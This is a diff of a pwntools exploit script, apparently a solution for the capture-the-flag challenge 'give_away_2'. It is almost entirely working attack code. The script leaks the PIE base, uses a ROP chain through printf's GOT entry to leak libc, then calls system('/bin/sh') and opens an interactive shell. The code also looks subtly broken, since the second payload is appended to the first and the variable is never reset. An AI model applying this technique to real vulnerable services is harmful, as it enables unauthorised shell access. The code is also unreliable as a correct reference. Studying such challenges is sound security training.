@@ -1,22 +1,37 @@
-main = int(p.recvline().split(b": ")[1].strip(), 16)
+from pwn import *
+context.log_level = 'DEBUG'
+p=process("./give_away_2")
+elf=ELF("./give_away_2")
+libc=elf.libc
+pause()
+p.recvuntil("Give away: ")
+main = int(p.recvline(),16)
+log.info("MAIN: "+hex(main))
+base = main - elf.symbols['main']
+log.info("BASE: "+hex(base))
+elf.address = base
+pop_rdi = base + 0x0000000000000903 
 
-pie_base = main - elf.symbols['main']
-
-elf.address = pie_base
-
-pop_rdi = pie_base + 0x0000000000000903 # pop rdi; ret;
-pop_rsi_r15 = pie_base + 0x0000000000000901 # pop rsi; pop r15; ret; 
-got = pie_base + 0x000000000201040
-fmt = pie_base + 0x924
-bss = elf.bss()
-
-log.info("PIE:     "+hex(pie_base))
-
-
-payload = b"A"*40
-payload += p64(pop_rdi + 1)
+payload = 'A'*40
+payload += p64(pop_rdi+1)
 payload += p64(pop_rdi)
 payload += p64(elf.got['printf'])
 payload += p64(elf.plt['printf'])
 payload += p64(elf.symbols['vuln'])
-pause()
+p.sendline(payload)
+
+leak = u64(p.recv(6).strip('').ljust(8,'\x00'))
+log.info("LEAK:"+hex(leak))
+libc.address =leak - libc.symbols['printf']
+log.info("LIBC:"+hex(libc.address))
+system =libc.symbols['system']
+log.info("SYSTEM: "+hex(system))
+binsh =libc.search("/bin/sh\x00").next()
+log.info("BINSH: "+hex(binsh))
+#one_gadget = libc.address + 0xc83c0
+payload += 'A'*40
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(system)
+p.sendline(payload)
+p.interactive()
